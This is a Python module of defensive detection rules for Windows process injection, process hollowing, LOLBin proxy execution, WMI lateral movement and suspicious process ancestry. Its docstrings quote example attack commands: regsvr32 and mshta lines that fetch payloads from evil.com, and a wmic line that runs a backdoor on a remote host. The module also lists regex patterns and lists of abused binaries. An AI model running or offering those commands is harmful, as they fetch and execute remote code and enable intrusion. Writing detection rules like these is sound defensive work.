"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  DETECTION RULES — PROCESS INJECTION & EVASION                             ║
║  MITRE ATT&CK: T1055 (Process Injection), T1620 (Reflective Loading)       ║
║                                                                              ║
║  Rules detect:                                                               ║
║    - CreateRemoteThread (classic DLL/shellcode injection)                   ║
║    - Process hollowing / process tampering                                  ║
║    - Unusual processes spawned by system processes                          ║
║    - WMIC / WMI lateral movement                                            ║
║    - Suspicious process ancestry chains                                     ║
║    - LOLBin proxy execution                                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import re
from typing import Optional
from detection_engine.event_schema import (
    BaseEvent, CreateRemoteThreadEvent, ProcessTamperingEvent,
    ProcessCreateEvent, DetectionAlert
)
from detection_engine.rules.base_rule import BaseRule


# Processes that should NEVER inject into other processes
INJECTION_BLACKLIST_SOURCES = {
    "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe",
    "cscript.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe",
    "excel.exe", "winword.exe", "outlook.exe", "powerpnt.exe",
}

# High-value injection targets — if these get injected into, it's serious
HIGH_VALUE_TARGETS = {
    "lsass.exe",        # Credential store
    "svchost.exe",      # Hide in a trusted process
    "explorer.exe",     # User's desktop process
    "spoolsv.exe",      # Print spooler (common injection target)
    "dllhost.exe",      # COM object host
    "winlogon.exe",     # Login process
    "csrss.exe",        # Critical system process
    "wininit.exe",
}

# LOLBin proxy executors — used to execute code while appearing legitimate
LOLBIN_EXECUTORS = {
    "regsvr32.exe",     # Execute DLLs and remote scriptlets
    "rundll32.exe",     # Execute DLL exported functions
    "mshta.exe",        # Execute HTA (VBScript/JScript)
    "installutil.exe",  # AppLocker bypass
    "cmstp.exe",        # Execute COM scriptlets
    "msbuild.exe",      # Execute inline C# tasks
    "dnscmd.exe",       # Execute DLLs as DNS plugins
    "odbcconf.exe",     # Execute DLLs via ODBCCONF REGSVR
    "xwizard.exe",      # Execute DLLs
    "appsyncpublishingserver.exe",
    "presentationhost.exe",
}


class CreateRemoteThreadRule(BaseRule):
    """
    Detects CreateRemoteThread API calls — the foundation of most injection techniques.

    Process injection via CreateRemoteThread works by:
    1. Opening a handle to the target process (VirtualAllocEx + WriteProcessMemory)
    2. Writing shellcode or DLL path into target's memory
    3. Creating a new thread in the target via CreateRemoteThread

    Virtually NO legitimate software injects threads into other processes.
    Exceptions: Some AV/EDR products, WerFault (crash handler).
    """
    rule_id = "INJ001"
    rule_name = "CreateRemoteThread Injection"
    description = "Process injected a thread into another process — classic code injection technique"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1055.001"
    mitre_technique_name = "Dynamic-link Library Injection"
    severity = 9
    event_types = (CreateRemoteThreadEvent,)

    # Processes that legitimately inject (reduce false positives)
    LEGITIMATE_INJECTORS = {
        "werfault.exe",         # Windows Error Reporting
        "werfaultsecure.exe",
        "csrss.exe",            # Windows subsystem
        "mssecsvr.exe",         # Microsoft Defender
    }

    def evaluate(self, event: CreateRemoteThreadEvent) -> Optional[DetectionAlert]:
        src = event.source_image_name
        tgt = event.target_image_name

        if src in self.LEGITIMATE_INJECTORS:
            return None

        # Calculate severity based on what's being targeted
        sev = self.severity
        if tgt in HIGH_VALUE_TARGETS:
            sev = 10
            target_note = f"HIGH-VALUE TARGET: {tgt}"
        elif src in INJECTION_BLACKLIST_SOURCES:
            sev = 10
            target_note = f"suspicious source process"
        else:
            target_note = ""

        desc = (
            f"Thread injection: '{src}' (PID {event.source_process_id}) "
            f"→ '{tgt}' (PID {event.target_process_id}). "
            f"Start address: {event.start_address}. "
            f"Start module: {event.start_module or 'unknown'}. "
            + (f"⚠️ {target_note}" if target_note else "")
        )
        alert = self._make_alert(event, desc)
        alert.severity = sev
        return alert


class ProcessTamperingRule(BaseRule):
    """
    Detects process tampering — advanced evasion techniques that modify
    a process's memory image after it starts.

    Techniques covered:
    - Process Hollowing: Start a process, hollow out its memory, inject malcode
    - Process Doppelgänging: Use NTFS transactions to load a fake image
    - Process Herpaderping: Overwrite the executable file after mapping it
    - Process Ghosting: Modify process image through file deletion trick

    Sysmon Event ID 25 detects when a process's image doesn't match
    what's on disk — a clear sign of tampering.
    """
    rule_id = "INJ002"
    rule_name = "Process Image Tampering"
    description = "Process image modified after startup — process hollowing or injection"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1055.012"
    mitre_technique_name = "Process Hollowing"
    severity = 10
    event_types = (ProcessTamperingEvent,)

    def evaluate(self, event: ProcessTamperingEvent) -> Optional[DetectionAlert]:
        desc = (
            f"Process tampering detected in '{event.image_name}' (PID {event.process_id}). "
            f"Tampering type: {event.tampering_type}. "
            f"The process image in memory does not match what's on disk. "
            f"This is a definitive indicator of process hollowing, doppelgänging, or herpaderping."
        )
        return self._make_alert(event, desc)


class LOLBinProxyExecutionRule(BaseRule):
    """
    Detects Living-off-the-Land binary (LOLBin) proxy execution.

    LOLBins are trusted Windows binaries that can be abused to execute
    arbitrary code while appearing legitimate. Key examples:
    - regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll (Squiblydoo)
    - rundll32 javascript:"\\..\\mshtml,RunHTMLApplication "...
    - mshta http://evil.com/payload.hta
    - msbuild.exe malicious.proj (inline task execution)
    """
    rule_id = "INJ003"
    rule_name = "LOLBin Proxy Execution"
    description = "Windows LOLBin used to execute code — AppLocker/defense bypass"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1218"
    mitre_technique_name = "System Binary Proxy Execution"
    severity = 8
    event_types = (ProcessCreateEvent,)

    LOLBIN_PATTERNS = {
        "regsvr32.exe": [
            re.compile(r'(?i)/s.*?scrobj\.dll'),
            re.compile(r'(?i)/i:https?://'),
            re.compile(r'(?i)/n.*?/u'),
        ],
        "rundll32.exe": [
            re.compile(r'(?i)javascript:'),
            re.compile(r'(?i)vbscript:'),
            re.compile(r'(?i)shell32.*?ShellExec_RunDLL'),
            re.compile(r'(?i)url\.dll.*?OpenURL'),
        ],
        "mshta.exe": [
            re.compile(r'(?i)https?://'),
            re.compile(r'(?i)vbscript:'),
            re.compile(r'(?i)javascript:'),
        ],
        "msbuild.exe": [
            re.compile(r'(?i)\\(temp|tmp|appdata|users\\public)\\'),
        ],
        "installutil.exe": [
            re.compile(r'(?i)/logfile=\s*/LogToConsole=false'),
            re.compile(r'(?i)\\(temp|appdata|users\\public)\\'),
        ],
        "cmstp.exe": [
            re.compile(r'(?i)/s\s+.*\.(inf|cmd|bat)'),
        ],
    }

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        img = event.image_name
        if img not in self.LOLBIN_PATTERNS:
            return None

        cmd = event.command_line or ""
        for pattern in self.LOLBIN_PATTERNS[img]:
            if pattern.search(cmd):
                desc = (
                    f"LOLBin proxy execution: '{img}' with suspicious arguments. "
                    f"Matched pattern: {pattern.pattern}. "
                    f"This technique bypasses application whitelisting. "
                    f"Command: {cmd[:300]}. Parent: {event.parent_image_name}"
                )
                return self._make_alert(event, desc)

        return None


class WMILateralMovementRule(BaseRule):
    """
    Detects WMI used for lateral movement or remote execution.

    WMI (Windows Management Instrumentation) can execute processes remotely:
    > wmic /node:REMOTEHOST process call create "cmd.exe /c backdoor.exe"

    This is used extensively for lateral movement because it:
    - Uses a legitimate Windows service (WinMgmt)
    - Doesn't require dropped files (can run commands directly)
    - Leaves minimal forensic artifacts
    """
    rule_id = "INJ004"
    rule_name = "WMI Remote Execution"
    description = "WMIC used for remote command execution — possible lateral movement"
    mitre_tactic = "Lateral Movement"
    mitre_technique_id = "T1021.006"
    mitre_technique_name = "Windows Remote Management"
    severity = 8
    event_types = (ProcessCreateEvent,)

    WMI_LATERAL_PATTERNS = [
        re.compile(r'(?i)/node:\s*["\']?(?!localhost|127\.0\.0\.1|::1)[\w\-\.]+'),
        re.compile(r'(?i)process\s+call\s+create'),
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name != "wmic.exe":
            return None

        cmd = event.command_line or ""
        matched = []
        for pattern in self.WMI_LATERAL_PATTERNS:
            if pattern.search(cmd):
                matched.append(pattern.pattern)

        if not matched:
            return None

        desc = (
            f"WMIC remote execution: possible lateral movement. "
            f"Command: {cmd[:300]}. "
            f"Parent: {event.parent_image_name}. User: {event.user}"
        )
        return self._make_alert(event, desc)


class SuspiciousProcessAncestryRule(BaseRule):
    """
    Detects unusual process spawn chains that indicate living-off-the-land attacks.

    Legitimate Windows processes have predictable parents. When a process
    appears under an unexpected parent, it indicates process hollowing,
    WMI spawning, or script-based execution.

    Examples of suspicious chains:
    - winword.exe → cmd.exe → powershell.exe  (macro → shell → payload)
    - services.exe → powershell.exe            (service-based persistence)
    - wmiprvse.exe → cmd.exe → net.exe         (WMI lateral movement)
    """
    rule_id = "INJ005"
    rule_name = "Suspicious Process Ancestry"
    description = "Unusual parent-child process relationship — possible code execution"
    mitre_tactic = "Execution"
    mitre_technique_id = "T1059"
    mitre_technique_name = "Command and Scripting Interpreter"
    severity = 7
    event_types = (ProcessCreateEvent,)

    # (parent, child) pairs that are almost always malicious
    SUSPICIOUS_CHAINS = [
        ("wmiprvse.exe", "cmd.exe"),
        ("wmiprvse.exe", "powershell.exe"),
        ("wmiprvse.exe", "net.exe"),
        ("wmiprvse.exe", "whoami.exe"),
        ("services.exe", "powershell.exe"),
        ("services.exe", "cmd.exe"),
        ("taskeng.exe", "powershell.exe"),
        ("taskhost.exe", "powershell.exe"),
        ("winlogon.exe", "cmd.exe"),
        ("winlogon.exe", "powershell.exe"),
        ("svchost.exe", "powershell.exe"),
        ("svchost.exe", "cmd.exe"),
        # Office spawning anything is suspicious
        ("winword.exe", "cmd.exe"),
        ("winword.exe", "powershell.exe"),
        ("winword.exe", "wscript.exe"),
        ("winword.exe", "cscript.exe"),
        ("excel.exe", "cmd.exe"),
        ("excel.exe", "powershell.exe"),
        ("outlook.exe", "cmd.exe"),
        ("outlook.exe", "powershell.exe"),
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        parent = event.parent_image_name
        child = event.image_name

        for sus_parent, sus_child in self.SUSPICIOUS_CHAINS:
            if parent == sus_parent and child == sus_child:
                desc = (
                    f"Suspicious process chain: '{parent}' → '{child}'. "
                    f"PID: {event.process_id}. "
                    f"Command: {event.command_line[:200]}. "
                    f"User: {event.user}"
                )
                return self._make_alert(event, desc)

        return None


ALL_RULES = [
    CreateRemoteThreadRule,
    ProcessTamperingRule,
    LOLBinProxyExecutionRule,
    WMILateralMovementRule,
    SuspiciousProcessAncestryRule,
]
